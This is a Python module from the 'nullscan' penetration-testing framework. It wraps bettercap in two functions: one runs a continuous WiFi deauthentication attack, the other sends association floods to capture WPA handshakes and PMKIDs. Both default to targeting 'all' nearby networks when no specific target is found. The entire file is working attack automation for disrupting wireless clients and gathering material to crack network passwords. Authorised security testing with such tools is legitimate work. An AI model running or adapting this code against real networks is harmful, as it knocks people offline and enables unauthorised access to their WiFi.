#!/usr/bin/env python3
# -*- coding: utf-8 -*- ########################################################
#               ____                     _ __                                  #
#    ___  __ __/ / /__ ___ ______ ______(_) /___ __                            #
#   / _ \/ // / / (_-</ -_) __/ // / __/ / __/ // /                            #
#  /_//_/\_,_/_/_/___/\__/\__/\_,_/_/ /_/\__/\_, /                             #
#                                           /___/ team                         #
#                                                                              #
# nullscan                                                                     #
# A modular framework designed to chain and automate security tests            #
#                                                                              #
# FILE                                                                         #
# handshake.py                                                                 #
#                                                                              #
# AUTHOR                                                                       #
# noptrix@nullsecurity.net                                                     #
#                                                                              #
################################################################################


# sys imports


# own imports
from modules.libs.base import Base, tool, timeout
import modules.libs.wifi as wifi


class Handshake(Base):
  """ Handshake WiFi module """


  def __init__(self, target, opts):
    """ init """

    Base.__init__(self, target, opts)

    return


  @tool
  def bettercap_wifi_deauth(self):
    """
    DESCR: Perform WiFi deauth attack. (ext)
    TOOLS: bettercap
    """

    kb = wifi.KbWifi(self)
    interface = self.target
    tool_name = 'bettercap'
    sta = self.opts['station_mac']
    bssid = self.opts['bssid']
    ssid = self.opts['ssid']
    channel = self.opts['wifi_channel']

    target = None
    if len(sta) > 0:
      target = sta
    elif len(bssid) > 0:
      t = kb.targets({'bssid': bssid})
      if len(t['aps']) > 0:
        ap = t['aps'].pop()
        target = ap.bssid
        channel = ap.channel
    elif len(ssid) > 0:
      t = kb.targets({'ssid': ssid})
      if len(t['aps']) > 0:
        ap = t['aps'].pop()
        target = ap.bssid
        channel = ap.channel
      else:
        target = 'all'
    else:
      target = 'all'

    channel_opt = ''
    if len(channel) > 0:
       channel_opt = f'wifi.recon.channel {channel};'

    bc_script = f'set wifi.handshakes.file {tool_name}_handshake.pcap.log;'+\
                 'wifi.recon on;'+\
                f'set ticker.period 7;'+\
                 'set ticker.commands '+\
                   f'\\"wifi.deauth {target}\\";'+\
                  channel_opt+\
                 'ticker on;'
    opts = f'-iface {interface} -no-colors -eval "{bc_script}"'
    self._run_tool(tool_name, opts,
      timeout=self.opts['wifi_timeout'],
      logfile=tool_name+'_wifi_deauth'
      )

    return


  @tool
  def bettercap_wifi_assoc(self):
    """
    DESCR: Perform WiFi assoc. (ext)
    TOOLS: bettercap
    """

    kb = wifi.KbWifi(self)
    interface = self.target
    tool_name = 'bettercap'
    bssid = self.opts['bssid']
    ssid = self.opts['ssid']
    channel = self.opts['wifi_channel']

    target = None
    if len(bssid) > 0:
      target = bssid
    elif len(ssid) > 0:
      t = kb.targets({'ssid': ssid})
      if len(t['aps']) > 0:
        target = t['aps'].pop().bssid
      else:
        target = 'all'
    else:
      target = 'all'

    channel_opt = ''
    if len(channel) > 0:
       channel_opt = f'wifi.recon.channel {channel};'

    bc_script = f'set wifi.handshakes.file {tool_name}_pmkid.pcap.log;'+\
                 'wifi.recon on;'+\
                f'set ticker.period 7;'+\
                 'set ticker.commands '+\
                   f'\\"wifi.assoc {target}\\";'+\
                  channel_opt+\
                 'ticker on;'
    opts = f'-iface {interface} -no-colors -eval "{bc_script}"'
    self._run_tool(tool_name, opts,
      timeout=self.opts['wifi_timeout'],
      logfile=tool_name+'_wifi_assoc'
      )

    return


# EOF
